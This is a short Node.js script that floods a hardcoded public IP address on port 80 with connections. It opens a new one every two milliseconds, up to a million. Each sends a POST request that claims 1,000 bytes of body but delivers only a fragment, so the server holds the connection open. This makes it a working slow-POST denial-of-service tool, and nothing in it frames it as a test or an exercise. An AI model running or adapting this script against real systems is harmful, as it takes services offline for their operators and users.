var net = require('net');

var maxConnections = 1000000;
var connections = [];

var host = "88.99.37.146";
var port = 80;

function Connection(h, p) {
	this.state = 'active';
	this.t = Date.now();

	this.client = net.connect({port: p, host: h}, () => {
		process.stdout.write("Connected, Sending... ");

		this.client.write(
			"POST / HTTP/1.1\r\nHost: " + host + "\r\n" +
			"Content-Type: application/x-www-form-urlenconded\r\n" +
			`Content-Length: 1000\r\n\r\nemail=321&d1=password&l`);

		process.stdout.write("Written.\n");
	});
	this.client.on('data', (data) => {
		console.log("\t-Received " + data.length + " bytes...");
		this.client.end();
	});
	this.client.on('end', () => {
		var d = Date.now() - this.t;
		this.state = 'ended';

		console.log("\t-Disconnected (duration: " +
			(d / 1000).toFixed(3) +
			" seconds, remaining open: " +
			connections.length +
			").");
	});
	this.client.on('error', () => {
		this.state = 'error';
	});

	connections.push(this);
}

setInterval(() => {
	var notify = false;

	// Add another connection if we haven't reached
	// our max:
	if (connections.length < maxConnections) {
		new Connection(host, port);
		notify = true;
	}

	// Remove dead connections
	connections = connections.filter(function (v) {
		return v.state == 'active';
	});

	if (notify) {
		console.log("Active connections: " + connections.length +
			" / " + maxConnections);
	}
}, 2);
